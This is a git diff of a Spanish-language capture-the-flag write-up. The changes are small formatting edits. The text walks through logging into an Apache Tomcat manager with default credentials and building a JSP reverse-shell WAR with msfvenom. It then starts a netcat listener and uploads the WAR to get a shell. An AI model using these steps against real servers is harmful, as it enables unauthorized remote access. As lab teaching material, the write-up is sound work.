@@ -98,6 +98,7 @@ Si buscamos en páginas como [Hacktricks](https://book.hacktricks.xyz/v/es), por
 <br>
 
 Probamos las credenciales que aparecen ahí, y las que funcionan son las de `tomcat:s3cr3t`, como bien habiamos encontrado en el fichero (`tomcat.txt`) del servidor ftp, existía un usuario `tomcat`.
+
 <br>
 
 Ahora nos encontramos con el panel de admin de apache, que tiene esta pinta:
@@ -114,33 +115,38 @@ Ahora lo que debemos hacer es buscar alguna manera de intentar entrar en la máq
 
 <br>
 
-Nos dice que tenemos que subir un archivo `.war`, para ello usaremos `msfvenom` como bien nos indica la página de [Hacktricks](https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-web/tomcat) con el siguiente comando: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war` <br>
+Nos dice que tenemos que subir un archivo `.war`, para ello usaremos `msfvenom` como bien nos indica la página de [Hacktricks](https://book.hacktricks.xyz/v/es/network-services-pentesting/pentesting-web/tomcat) con el siguiente comando: `msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=443 -f war -o revshell.war`. <br>
 `-p` ⮞ le especificamos el payload a usar <br>
 `LHOST` ⮞ nuestra dirección ip <br> 
 `LPORT` ⮞ nuestro puerto por el cual nos pondremos en escucha <br>
 `-f` ⮞ formato para exportar el payload <br> 
 `-o` ⮞ guardar el payload en un archivo 
+
 <br>
 
 Observamos que se nos ha generado el archivo con el cual nos mandaremos una reverse shell:
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/9b8d56e1-0948-48ab-aef3-634c4eb15c83)
+
 <br>
 
 En primer lugar, nos pondremos en escucha por el puerto especificado, en este caso el `443` con el siguiente comando `nc -nlvp 443`.
+
 <br>
 
 En segundo lugar, subiremos el archivo `revshell.war` al Panel de Administrador de Tomcat en el apartado que dice `WAR file to deploy`:
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/c3bf91d8-afb9-4d55-9a24-37c3b158f50f)
+
 <br>
 
 Nos dice que se ha subido correctamente, comprobamos que el archivo se encuentra en esta tabla:
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/75c1bbf3-54ae-436d-b049-4090c98d4ca4)
+
 <br>
 
 Una vez que le hemos dado click recibiremos la revshell, por el puerto que nos habiamos puesto en escucha
